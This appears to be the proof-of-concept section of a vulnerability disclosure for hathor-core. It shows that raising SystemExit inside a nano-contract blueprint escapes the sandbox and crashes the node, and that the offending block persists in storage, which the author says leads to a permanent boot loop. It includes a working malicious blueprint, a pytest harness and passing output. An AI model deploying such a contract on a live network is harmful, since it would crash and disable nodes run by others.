## Proof of Concept

I wrote 7 tests that run inside hathor-core's own test framework. The key one is `test_systemexit_triggers_crash_and_exit`, which uses `SimulatorTestCase` to spin up a full Hathor node with a miner, wallet, RocksDB DAG, consensus engine, and vertex handler. It registers a blueprint containing `raise SystemExit()` in the NC catalog, creates a contract via a NC transaction, mines blocks to confirm it, then creates a second transaction calling `crash_node()` and mines a block that includes it. When `vertex_handler.propagate_tx` processes that block, NC execution runs the blueprint code, `SystemExit` escapes through MeteredExecutor and Runner, reaches the `except BaseException` in vertex_handler, and `crash_and_exit()` is triggered.

After the crash, the test checks three things that prove this is permanent, not a one time crash. First, the block is still in RocksDB storage (`transaction_exists(block.hash)` returns true) because `_unsafe_save_and_run_consensus` saves the block at `vertex_handler.py:229` before `unsafe_update` runs NC execution at line 232. Second, the malicious transaction is also in storage. Third, the block is marked with `CONSENSUS_FAIL_ID` in its metadata, which is what the `except BaseException` handler writes at lines 178-182 before calling `crash_and_exit`. Any node syncing this chain would receive the same block, process it, execute the NC code, and crash the same way.

The only mock is `crash_and_exit` itself -- we can't let `sys.exit(-1)` kill the test process. Everything else runs through the real code path.

The other tests cover the sandbox escape at the Runner level (`test_systemexit_escapes_sandbox` shows SystemExit propagates uncaught from `Runner.call_public_method()`, while the control test `test_normal_exception_is_caught` shows ValueError is properly caught as NCFail) and verify that `SystemExit`, `KeyboardInterrupt`, `BaseException`, and `GeneratorExit` are all in `EXEC_BUILTINS` and none are in `DISABLED_BUILTINS`.

### Setup

```bash
git clone https://github.com/HathorNetwork/hathor-core.git && cd hathor-core
python3.11 -m venv .venv && source .venv/bin/activate && pip install -e ".[dev]"
```

Place the test file at `hathor_tests/nanocontracts/test_systemexit_escape.py` and run:

```bash
python -m pytest hathor_tests/nanocontracts/test_systemexit_escape.py -v -o "addopts="
```

### test_systemexit_escape.py

```python
"""
PoC: SystemExit sandbox escape in Hathor nano contracts

Runs inside hathor-core's own test framework. The main test
(test_systemexit_triggers_crash_and_exit) uses SimulatorTestCase to spin
up a full Hathor node, deploy a malicious blueprint, mine blocks, then
trigger crash_and_exit through the real vertex handler path. It also
verifies that the block and transaction persist in RocksDB after the
crash, which is what makes this a permanent boot loop rather than a
one-time crash.
"""

from io import StringIO
from textwrap import dedent
from unittest.mock import Mock

from hathor.conf import HathorSettings
from hathor.execution_manager import ExecutionManager
from hathor.nanocontracts import Blueprint, Context, public
from hathor.nanocontracts.catalog import NCBlueprintCatalog
from hathor.nanocontracts.custom_builtins import EXEC_BUILTINS, DISABLED_BUILTINS
from hathor.nanocontracts.exception import NCFail
from hathor.nanocontracts.method import Method
from hathor.nanocontracts.nc_types import make_nc_type_for_arg_type as make_nc_type
from hathor.nanocontracts.types import TokenUid
from hathor.nanocontracts.utils import sign_pycoin
from hathor.simulator.trigger import StopAfterMinimumBalance, StopAfterNMinedBlocks
from hathor.transaction import Transaction
from hathor.transaction.headers import NanoHeader
from hathor.types import VertexId
from hathor_tests.nanocontracts.blueprints.unittest import BlueprintTestCase
from hathor_tests.simulation.base import SimulatorTestCase

settings = HathorSettings()
TOKEN_NC_TYPE = make_nc_type(TokenUid)


class CrashBlueprint(Blueprint):
    token_uid: TokenUid

    @public
    def initialize(self, ctx: Context, token_uid: TokenUid) -> None:
        self.token_uid = token_uid

    @public
    def crash_node(self, ctx: Context) -> None:
        raise SystemExit()


MALICIOUS_BLUEPRINT_SRC = dedent('''
    from hathor import Blueprint, Context, export, public

    @export
    class CrashBlueprint(Blueprint):
        flag: int

        @public
        def initialize(self, ctx: Context) -> None:
            self.flag = 0

        @public
        def crash_node(self, ctx: Context) -> None:
            raise SystemExit()
''')


class TestSystemExitEscapesRunner(BlueprintTestCase):
    """SystemExit escapes the Runner -- real HathorManager + RocksDB."""

    def test_systemexit_escapes_sandbox(self):
        """SystemExit propagates uncaught through MeteredExecutor and Runner.

        metered_exec.py:107 catches Exception. SystemExit inherits from
        BaseException, not Exception. So it escapes. In production this
        reaches vertex_handler's except BaseException and calls crash_and_exit().
        """
        contract_id = self.gen_random_contract_id()
        blueprint_id = self._register_blueprint_contents(StringIO(MALICIOUS_BLUEPRINT_SRC))
        self.runner.create_contract(contract_id, blueprint_id, self.create_context())

        with self.assertRaises(SystemExit):
            self.runner.call_public_method(
                contract_id, 'crash_node', self.create_context()
            )

    def test_keyboardinterrupt_escapes_sandbox(self):
        """KeyboardInterrupt also escapes via the same BaseException gap."""
        src = dedent('''
            from hathor import Blueprint, Context, export, public

            @export
            class KBBlueprint(Blueprint):
                @public
                def initialize(self, ctx: Context) -> None:
                    pass

                @public
                def crash_node(self, ctx: Context) -> None:
                    raise KeyboardInterrupt()
        ''')
        contract_id = self.gen_random_contract_id()
        blueprint_id = self._register_blueprint_contents(StringIO(src))
        self.runner.create_contract(contract_id, blueprint_id, self.create_context())

        with self.assertRaises(KeyboardInterrupt):
            self.runner.call_public_method(
                contract_id, 'crash_node', self.create_context()
            )

    def test_normal_exception_is_caught(self):
        """Control: ValueError IS caught and wrapped as NCFail."""
        src = dedent('''
            from hathor import Blueprint, Context, export, public

            @export
            class SafeBlueprint(Blueprint):
                @public
                def initialize(self, ctx: Context) -> None:
                    pass

                @public
                def raise_error(self, ctx: Context) -> None:
                    raise ValueError("this should be caught")
        ''')
        contract_id = self.gen_random_contract_id()
        blueprint_id = self._register_blueprint_contents(StringIO(src))
        self.runner.create_contract(contract_id, blueprint_id, self.create_context())

        with self.assertRaises(NCFail):
            self.runner.call_public_method(
                contract_id, 'raise_error', self.create_context()
            )


class TestSystemExitCrashesNode(SimulatorTestCase):
    """Full node simulation -- crash_and_exit triggered, block persists in DAG."""
    __test__ = True

    def setUp(self):
        super().setUp()

        self.crash_blueprint_id = b'crash_bp' + b'\x00' * 24
        self.catalog = NCBlueprintCatalog({
            self.crash_blueprint_id: CrashBlueprint,
        })
        self.nc_seqnum = 0

        self.manager = self.simulator.create_peer()
        self.manager.allow_mining_without_peers()
        self.manager.tx_storage.nc_catalog = self.catalog

        self.wallet = self.manager.wallet

        self.miner = self.simulator.create_miner(self.manager, hashpower=100e6)
        self.miner.start()

        self.token_uid = TokenUid(b'\0')
        trigger = StopAfterMinimumBalance(self.wallet, self.token_uid, 1)
        self.assertTrue(self.simulator.run(7200, trigger=trigger))

    def _gen_nc_tx(self, nc_id, nc_method, nc_args):
        method_parser = Method.from_callable(getattr(CrashBlueprint, nc_method))
        nc = Transaction(timestamp=int(self.manager.reactor.seconds()))
        nc_args_bytes = method_parser.serialize_args_bytes(nc_args)

        address = self.wallet.get_unused_address()
        privkey = self.wallet.get_private_key(address)

        nano_header = NanoHeader(
            tx=nc,
            nc_seqnum=self.nc_seqnum,
            nc_id=nc_id,
            nc_method=nc_method,
            nc_args_bytes=nc_args_bytes,
            nc_address=b'',
            nc_script=b'',
            nc_actions=[],
        )
        nc.headers.append(nano_header)
        self.nc_seqnum += 1

        sign_pycoin(nano_header, privkey)

        nc.timestamp = int(self.manager.get_timestamp_for_new_vertex())
        nc.parents = self.manager.get_new_tx_parents(nc.timestamp)
        nc.weight = self.manager.daa.minimum_tx_weight(nc)
        return nc

    def test_systemexit_triggers_crash_and_exit(self):
        """Deploy blueprint, call method via mined block, node crashes.

        The only mock is crash_and_exit itself -- can't let sys.exit(-1)
        kill the test process. Everything else is real: real NC execution,
        real MeteredExecutor, real Runner, real block executor, real
        vertex handler, real RocksDB storage.
        """
        # Deploy the contract
        nc_tx = self._gen_nc_tx(self.crash_blueprint_id, 'initialize', [self.token_uid])
        self.manager.cpu_mining_service.resolve(nc_tx)
        self.manager.on_new_tx(nc_tx)
        self.assertIsNone(nc_tx.get_metadata().voided_by)

        nc_id = nc_tx.hash

        trigger = StopAfterNMinedBlocks(self.miner, quantity=2)
        self.assertTrue(self.simulator.run(14400, trigger=trigger))

        nc_storage = self.manager.get_best_block_nc_storage(nc_id)
        self.assertEqual(
            nc_storage.get_obj(b'token_uid', TOKEN_NC_TYPE),
            self.token_uid
        )

        # Stop the miner so we control block creation from here
        self.miner.stop()

        # Create the malicious transaction
        self.manager.reactor.advance(10)
        crash_tx = self._gen_nc_tx(nc_id, 'crash_node', [])
        self.manager.cpu_mining_service.resolve(crash_tx)
        self.manager.on_new_tx(crash_tx)
        self.assertIsNone(crash_tx.get_metadata().voided_by)

        # Mock crash_and_exit so it doesn't actually kill the process
        execution_manager_mock = Mock(spec_set=ExecutionManager)
        self.manager.vertex_handler._execution_manager = execution_manager_mock

        # Mine a block that includes crash_node(). vertex_handler
        # processes it, NC execution runs, SystemExit escapes, and
        # crash_and_exit is called.
        self.manager.reactor.advance(1)
        block = self.manager.generate_mining_block()
        self.manager.cpu_mining_service.resolve(block)
        self.manager.propagate_tx(block)

        # crash_and_exit was called -- node would be dead
        execution_manager_mock.crash_and_exit.assert_called()
        call_args = execution_manager_mock.crash_and_exit.call_args
        reason = call_args.kwargs.get('reason', call_args.args[0] if call_args.args else '')
        self.assertIn('on_new_vertex() failed', reason)

        # -- DAG persistence proof --
        # The block was saved to RocksDB BEFORE the exception propagated.
        # _unsafe_save_and_run_consensus (vertex_handler.py:229) calls
        # save_transaction(vertex) before unsafe_update runs NC execution.
        # So the block is in storage even though the node crashed.
        self.assertTrue(
            self.manager.tx_storage.transaction_exists(block.hash),
            "block must persist in storage after crash"
        )
        self.assertTrue(
            self.manager.tx_storage.transaction_exists(crash_tx.hash),
            "malicious tx must persist in storage after crash"
        )

        # The except BaseException handler (vertex_handler.py:178-182)
        # marks the block with CONSENSUS_FAIL_ID before calling
        # crash_and_exit. This is the state a restarting node would see.
        block_from_storage = self.manager.tx_storage.get_transaction(block.hash)
        block_meta = block_from_storage.get_metadata()
        self.assertIn(
            self._settings.CONSENSUS_FAIL_ID,
            block_meta.voided_by or set(),
            "block must be marked CONSENSUS_FAIL_ID after crash"
        )


class TestBuiltinsExposure(BlueprintTestCase):
    """Root cause: dangerous builtins exposed, not blocked."""

    def test_systemexit_exposed_not_blocked(self):
        assert 'SystemExit' in EXEC_BUILTINS
        assert 'SystemExit' not in DISABLED_BUILTINS

        # They blocked exit() but not SystemExit itself
        assert 'exit' in DISABLED_BUILTINS

    def test_all_baseexception_subclasses_exposed(self):
        for name in ('BaseException', 'KeyboardInterrupt', 'GeneratorExit'):
            assert name in EXEC_BUILTINS, f"{name} in EXEC_BUILTINS"
            assert name not in DISABLED_BUILTINS, f"{name} not in DISABLED_BUILTINS"

    def test_exception_hierarchy(self):
        """SystemExit is BaseException, not Exception. That's the gap."""
        assert issubclass(SystemExit, BaseException)
        assert not issubclass(SystemExit, Exception)
        assert issubclass(KeyboardInterrupt, BaseException)
        assert not issubclass(KeyboardInterrupt, Exception)
```

### Output

```
TestSystemExitEscapesRunner::test_systemexit_escapes_sandbox PASSED
TestSystemExitEscapesRunner::test_keyboardinterrupt_escapes_sandbox PASSED
TestSystemExitEscapesRunner::test_normal_exception_is_caught PASSED
TestSystemExitCrashesNode::test_systemexit_triggers_crash_and_exit PASSED
TestBuiltinsExposure::test_systemexit_exposed_not_blocked PASSED
TestBuiltinsExposure::test_all_baseexception_subclasses_exposed PASSED
TestBuiltinsExposure::test_exception_hierarchy PASSED

7 passed in 7.28s
```
